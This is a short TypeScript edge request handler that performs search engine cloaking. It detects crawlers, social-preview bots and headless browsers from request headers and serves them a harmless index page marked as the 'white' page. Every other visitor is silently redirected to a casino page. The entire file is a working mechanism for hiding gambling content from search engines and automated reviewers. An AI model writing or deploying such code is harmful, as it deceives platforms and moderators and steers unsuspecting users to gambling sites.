export default async function handler(request: Request): Promise<Response> {
  const ua = (request.headers.get('user-agent') || '').toLowerCase();
  const acceptLang = (request.headers.get('accept-language') || '').toLowerCase();
  const secFetchDest = request.headers.get('sec-fetch-dest') || '';
  const secFetchMode = request.headers.get('sec-fetch-mode') || '';

  const botRegex =
    /(bot|crawler|spider|crawling|google|bing|yandex|duckduckgo|baidu|slurp|embedly|quora|reddit|sogou|twitterbot|telegrambot|linkedin|whatsapp|discord|vkbot|applebot|facebookexternalhit|pinterest)/i;

  const isHeadlessHint = /headless|puppeteer|playwright/.test(ua);
  const isBot =
    botRegex.test(ua) ||
    isHeadlessHint ||
    (!acceptLang && secFetchDest === 'document' && secFetchMode === 'navigate');

  const indexUrl = new URL('/index.html', request.url).toString();
  const casinoUrl = new URL('/casino.html', request.url).toString();

  if (isBot) {
    const res = await fetch(indexUrl, { headers: { 'x-edge-proxy': 'white' } });
    return new Response(await res.text(), {
      status: 200,
      headers: {
        'content-type': 'text/html; charset=utf-8',
        'cache-control': 'public, max-age=0, must-revalidate',
      },
    });
  }

  return Response.redirect(casinoUrl, 302);
}
